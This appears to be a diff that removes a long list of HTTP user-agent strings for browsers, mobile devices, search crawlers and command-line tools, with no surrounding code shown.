-  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
-
-  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N910P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
-
-  "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36",
-
-  "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
-
-  "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER",
-
-  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.0; rv:38.0) Gecko/20100101 Firefox/38.0",
-
-  "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
-
-  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0",
-
-  "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0",
-
-  "Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0",
-
-  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.154 Safari/537.36 LBBROWSER",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; ASJB; ASJB; MAAU; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSSEM; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
-
-  "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0",
-
-  "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)",
-
-  "Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
-
-  "Mozilla/5.0 (X11; CrOS x86_64 7077.95.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.90 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0",
-
-  "Mozilla/5.0 (X11; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/33.0.0.0 Safari/534.24",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.76 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2",
-
-  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-en) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.8 (KHTML, like Gecko)",
-
-  "Mac OS X/10.6.8 (10K549); ExchangeWebServices/1.3 (61); Mail/4.6 (1085)",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
-
-  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.7.8 (KHTML, like Gecko) Version/9.1.3 Safari/537.86.7",
-
-  "MacOutlook/0.0.0.150815 (Intel Mac OS X Version 10.10.5 (Build 14F27))",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:46.0) Gecko/20100101 Firefox/46.0",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:44.0) Gecko/20100101 Firefox/44.0",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0",
-
-  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:52.0) Gecko/20100101 Firefox/52.0",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:38.0) Gecko/20100101 Firefox/38.0",
-
-  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
-
-  "Mozilla/5.0 CK={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
-
-  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
-
-  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763",
-
-  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; KTXN)",
-
-  "Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
-
-  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
-
-  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
-
-  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
-
-  "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0",
-
-  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
-
-  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
-
-  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)",
-
-  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362",
-
-  "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
-
-  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
-
-  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
-
-  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
-
-  "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063",
-
-  "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
-
-  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
-
-  "Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0",
-
-  "Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy)",
-
-  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-
-  "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
-
-  "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
-
-  "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)",
-
-  "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
-
-  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-
-  "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
-
-  "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)",
-
-  "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0",
-
-  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0",
-
-  "Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/71.0.3578.141 Safari/534.24 XiaoMi/MiuiBrowser/12.4.3-g",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/69.0.3497.81 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36",
-
-  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060124 Firefox/1.5.0.1",
-
-  "Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0",
-
-  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/53.0.2785.143 Chrome/53.0.2785.143 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/80.0.3987.87 Chrome/80.0.3987.87 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.120 Chrome/37.0.2062.120 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:53.0) Gecko/20100101 Firefox/53.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/49.0.2623.108 Chrome/49.0.2623.108 Safari/537.36",
-
-  "Wget/1.17.1 (linux-gnu)",
-
-  "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0",
-
-  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:10.0) Gecko/20100101 Firefox/10.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:59.0) Gecko/20100101 Firefox/59.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36",
-
-  "Mozilla/5.0 (SMART-TV; Linux; Tizen 5.0) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.2 Chrome/63.0.3239.84 TV Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/70.0.3538.77 Chrome/70.0.3538.77 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
-
-  "Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3",
-
-  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.172 Safari/537.22",
-
-  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:63.0) Gecko/20100101 Firefox/63.0",
-
-  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36",
-
-  "Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0",
-
